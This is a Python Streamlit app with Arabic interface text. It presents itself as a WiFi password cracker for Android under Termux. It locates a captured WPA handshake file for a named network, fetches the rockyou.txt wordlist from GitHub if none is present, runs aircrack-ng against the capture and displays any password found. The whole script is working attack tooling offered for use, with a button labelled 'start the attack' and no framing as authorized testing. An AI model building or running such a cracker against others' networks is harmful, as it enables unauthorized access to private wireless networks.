#!/usr/bin/env python3
# أداة اختراق WiFi - تعمل على أندرويد (Termux)
# فقط أدخل اسم الشبكة وسيبحث عن الملف تلقائياً

import streamlit as st
import subprocess
import os
import tempfile
import time

# إعداد الصفحة
st.set_page_config(
    page_title="WiFi Cracker - منارة نونو",
    page_icon="🔓",
    layout="centered"
)

st.markdown("# 🔓 WiFi Password Cracker")
st.markdown("### أدخل اسم الشبكة فقط والباقي على المنارة")
st.markdown("---")

# ============================================================
# مجلد المصافحات الافتراضي
# ============================================================
HANDSHAKE_DIR = os.path.expanduser("~/handshakes")
os.makedirs(HANDSHAKE_DIR, exist_ok=True)

# ============================================================
# إدخال اسم الشبكة فقط
# ============================================================
ssid = st.text_input(
    "📶 أدخل اسم الشبكة (SSID):",
    placeholder="مثال: My_WiFi",
    help="سيتم البحث عن ملف المصافحة باسم: ~/handshakes/My_WiFi.cap"
)

# ============================================================
# البحث التلقائي عن ملف المصافحة
# ============================================================
cap_file = None
if ssid:
    # تنظيف اسم الملف
    clean_ssid = ssid.replace(" ", "_").replace("/", "_")
    cap_path = os.path.join(HANDSHAKE_DIR, f"{clean_ssid}.cap")
    
    if os.path.exists(cap_path):
        cap_file = cap_path
        st.success(f"✅ تم العثور على ملف المصافحة: `{clean_ssid}.cap`")
    else:
        st.warning(f"⚠️ لم يتم العثور على ملف المصافحة: `{clean_ssid}.cap`")
        st.info(f"📌 ضع الملف في: `{HANDSHAKE_DIR}/{clean_ssid}.cap`")

# ============================================================
# رفع يدوي اختياري (للمساعدة)
# ============================================================
with st.expander("📁 رفع ملف .cap يدوياً (اختياري)"):
    uploaded_cap = st.file_uploader(
        "ارفع ملف المصافحة (.cap أو .pcap)",
        type=["cap", "pcap"],
        label_visibility="collapsed"
    )
    if uploaded_cap is not None:
        with tempfile.NamedTemporaryFile(delete=False, suffix=".cap") as tmp:
            tmp.write(uploaded_cap.read())
            cap_file = tmp.name
            st.success("✅ تم رفع الملف بنجاح")

# ============================================================
# قائمة الكلمات
# ============================================================
st.markdown("---")
st.markdown("### 📚 قائمة الكلمات")

wordlist_path = None
use_default = st.checkbox("استخدام rockyou.txt الافتراضية", value=True)

if use_default:
    rockyou_paths = [
        "/usr/share/wordlists/rockyou.txt",
        os.path.expanduser("~/rockyou.txt"),
        os.path.expanduser("~/mini_rockyou.txt")
    ]
    for path in rockyou_paths:
        if os.path.exists(path):
            wordlist_path = path
            break
    
    if wordlist_path:
        st.success(f"✅ استخدام: `{os.path.basename(wordlist_path)}`")
    else:
        st.warning("⚠️ rockyou.txt غير موجودة، جارٍ التحميل...")
        mini_path = os.path.expanduser("~/mini_rockyou.txt")
        if not os.path.exists(mini_path):
            try:
                import urllib.request
                urllib.request.urlretrieve(
                    "https://raw.githubusercontent.com/brannondorsey/naive-hashcat/master/rockyou.txt",
                    mini_path
                )
                wordlist_path = mini_path
                st.success("✅ تم تحميل rockyou.txt المصغرة")
            except:
                st.error("فشل التحميل. استخدم قائمة مخصصة.")
                wordlist_path = None
        else:
            wordlist_path = mini_path
            st.success("✅ استخدام rockyou.txt المصغرة")
else:
    uploaded_wordlist = st.file_uploader(
        "📁 ارفع قائمة كلمات (txt)",
        type=["txt"]
    )
    if uploaded_wordlist is not None:
        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as tmp:
            tmp.write(uploaded_wordlist.read())
            wordlist_path = tmp.name
            st.success("✅ تم رفع القائمة")

# ============================================================
# زر الهجوم
# ============================================================
st.markdown("---")
if st.button("🚀 بدء الهجوم", use_container_width=True):
    # التحقق
    if not ssid:
        st.error("❌ يرجى إدخال اسم الشبكة.")
    elif cap_file is None:
        st.error("❌ لم يتم العثور على ملف مصافحة.")
        st.info(f"📌 ضع الملف في `{HANDSHAKE_DIR}/{ssid.replace(' ', '_')}.cap` أو ارفعه يدوياً.")
    elif wordlist_path is None:
        st.error("❌ لم يتم العثور على قائمة كلمات.")
    else:
        st.info(f"⏳ جاري اختراق الشبكة: **{ssid}** ...")

        # تشغيل aircrack-ng
        cmd = [
            "aircrack-ng",
            "-w", wordlist_path,
            "-e", ssid,
            cap_file
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )
            output = result.stdout + result.stderr

            st.markdown("### 📊 النتائج:")

            if "KEY FOUND" in output:
                for line in output.splitlines():
                    if "KEY FOUND" in line:
                        password = line.split(":")[-1].strip()
                        st.success(f"✅ تم العثور على كلمة المرور: `{password}`")
                        break
                with st.expander("📄 عرض التفاصيل الكاملة"):
                    st.code(output, language="bash")
            else:
                st.warning("❌ لم يتم العثور على كلمة المرور في القائمة.")
                with st.expander("📄 عرض التفاصيل الكاملة"):
                    st.code(output, language="bash")

        except subprocess.TimeoutExpired:
            st.error("⏰ انتهى الوقت المحدد (5 دقائق).")
        except FileNotFoundError:
            st.error("❌ أداة aircrack-ng غير مثبتة.")
            st.code("pkg install aircrack-ng", language="bash")
        except Exception as e:
            st.error(f"❌ حدث خطأ: {e}")

# ============================================================
# التذييل
# ============================================================
st.markdown("---")
st.markdown("💡 **طريقة الاستخدام:**")
st.markdown("1. ضع ملف المصافحة في `~/handshakes/اسم_الشبكة.cap`")
st.markdown("2. أدخل اسم الشبكة في الحقل أعلاه")
st.markdown("3. اضغط بدء الهجوم")

st.markdown("made by @cheifbreef on discord :)")